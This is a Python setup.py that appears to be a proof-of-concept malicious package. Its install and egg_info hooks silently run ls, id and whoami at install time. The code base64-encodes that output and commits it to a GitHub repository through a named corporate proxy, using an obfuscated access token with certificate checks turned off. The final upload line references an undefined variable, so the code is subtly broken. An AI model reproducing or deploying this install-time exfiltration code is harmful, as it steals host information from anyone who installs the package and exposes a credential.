from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import subprocess
import requests
import base64

def RunCommand():
    print("Hello, p0wnd!")
    text_to_send = "base:\n"
    command = "ls"
    result = subprocess.check_output(command, shell=True, text=True)
    text_to_send+=str(result)
    print(result)
    command = "id"
    result = subprocess.check_output(command, shell=True, text=True)
    text_to_send+=str(result)
    print(result)
    command = "whoami"
    result = subprocess.check_output(command, shell=True, text=True)
    text_to_send+=str(result)
    print(result)
    proxies = {
        'http': 'http://proxy.hub.gcp.groupement.systeme-u.fr:80',
        'https': 'http://proxy.hub.gcp.groupement.systeme-u.fr:80',
    }

    # r = requests.get('http://ngrok.io', proxies=proxies)
    # print(r.status_code)
    # print(r.text)
    # text_to_send+=str(r.text)
    t = str(base64.b64decode("Z2l0aHViX3BhdF8xMUFNRU5FN1E="))
    t += str(base64.b64decode("ME5iRExmdnBzV0RWRl9uQk5JUUEwdXZQTU5OTGR6b3ozUDBiMkJ1Rmp2MGdPbUpsOW95bXdoUERDVDdMQ01aVDI2WHh5Mk8xRw==="))
    url = "https://api.github.com/repos/androne23/this_is_fine_wuzzi/contents/exfiltrate.txt"
    headers = {
    'Accept': 'application/vnd.github+json',
    'Authorization': 'Bearer ' + t,
    }

    response = requests.request("GET", url, headers=headers, proxies=proxies, verify=False)
    print(response.status_code)
    print(response.text)
    
    msg = "exfiltration"
    text_to_send=base64.b64encode(text_to_send.encode("utf-8")).decode("utf-8")
    data = response.json()
    data = {
        "message": msg, # Put your commit message here.
        "content": text_to_send,
        "sha": data['sha']
    }
    r = requests.put(api, headers=headers, json=data, proxies=proxies, verify=False)
    print(r.text)


class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "this_is_fine_wuzzi",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)